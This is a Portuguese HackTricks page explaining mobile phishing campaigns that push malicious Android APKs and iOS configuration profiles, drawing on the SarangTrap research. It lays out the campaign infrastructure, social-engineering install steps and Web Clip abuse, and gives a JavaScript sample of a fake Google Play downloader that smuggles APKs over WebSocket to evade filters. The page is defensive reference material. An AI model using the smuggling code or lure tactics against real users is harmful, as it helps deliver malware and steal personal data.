# Phishing móvel e distribuição de Apps maliciosos (Android e iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página aborda técnicas usadas por threat actors para distribuir **APKs maliciosos para Android** e **perfis de configuração móveis para iOS** por meio de phishing (SEO, engenharia social, lojas falsas, dating apps etc.).
> O material foi adaptado da campanha SarangTrap, exposta pelo Zimperium zLabs (2025), e de outras pesquisas públicas.<sup>[[1]](#references)</sup>

## Fluxo do ataque

1. **Infraestrutura de SEO/Phishing**
* Registrar dezenas de domínios parecidos (dating, cloud share, serviço de carros etc.).
– Usar palavras-chave no idioma local e emojis no elemento `<title>` para obter uma boa posição no Google.
– Hospedar instruções de instalação para **Android** (`.apk`) e iOS na mesma landing page.
2. **Download do primeiro estágio**
* Android: link direto para um APK *unsigned* ou de uma “third-party store”.
* iOS: link `itms-services://` ou HTTPS simples para um perfil **mobileconfig** malicioso (veja abaixo).
3. **Comportamento pós-instalação no Android**
* Execução controlada por C2, abuso de permissões, bypasses de droppers, coleta em segundo plano e outros comportamentos de malware pós-instalação são abordados na página dedicada sobre Android Malware Post-Exploitation abaixo.
4. **Técnica de entrega para iOS**
* Um único **perfil de configuração móvel** pode solicitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. para inscrever o dispositivo em uma supervisão semelhante a “MDM”.
* Instruções de engenharia social:
1. Abrir Ajustes ➜ *Perfil baixado*.
2. Tocar em *Instalar* três vezes (capturas de tela na página de phishing).
3. Confiar no perfil unsigned ➜ o atacante obtém as permissões de *Contacts* e *Photo* sem a análise da App Store.
5. **Payload Web Clip do iOS (ícone de app de phishing)**
* Payloads `com.apple.webClip.managed` podem **fixar uma URL de phishing na Tela de Início** com um ícone/rótulo personalizado.
* Web Clips podem executar em **tela cheia** (ocultando a interface do navegador) e ser marcados como **não removíveis**, obrigando a vítima a excluir o perfil para remover o ícone.<sup>[[3]](#references)</sup>
6. **Camada de rede**
* HTTP simples, frequentemente na porta 80, com um HOST header como `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sem TLS → fácil de identificar).

## Android Malware Post-Exploitation

Para tradecraft de malware Android pós-instalação, como C2, abuso de Accessibility, overlays, automação ATS, carregamento de DEX em estágios, SMS premium e persistência, consulte a página dedicada Android Malware Post-Exploitation abaixo:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Smuggling de APK baseado em Socket.IO/WebSocket + páginas falsas do Google Play

Os atacantes estão cada vez mais substituindo links estáticos de APK por um canal Socket.IO/WebSocket incorporado em iscas que imitam o Google Play. Isso oculta a URL do payload, contorna filtros de URL/extensão e mantém uma UX de instalação realista.<sup>[[2]](#references)[[4]](#references)</sup>

Fluxo típico do cliente observado em ataques reais:

<details>
<summary>Downloader falso do Play baseado em Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Por que isso evita controles simples:
- Nenhuma URL estática de APK é exposta; o payload é reconstruído na memória a partir de frames WebSocket.
- Filtros de URL/MIME/extensão que bloqueiam respostas .apk diretas podem não detectar dados binários encapsulados via WebSockets/Socket.IO.
- Crawlers e sandboxes de URL que não executam WebSockets não recuperarão o payload.

Veja também técnicas e ferramentas de WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [O lado sombrio do romance: campanha de extorsão SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Configurações de payload de Web Clips para dispositivos Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Trojan Banker direcionado a usuários Android da Indonésia e do Vietnã](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
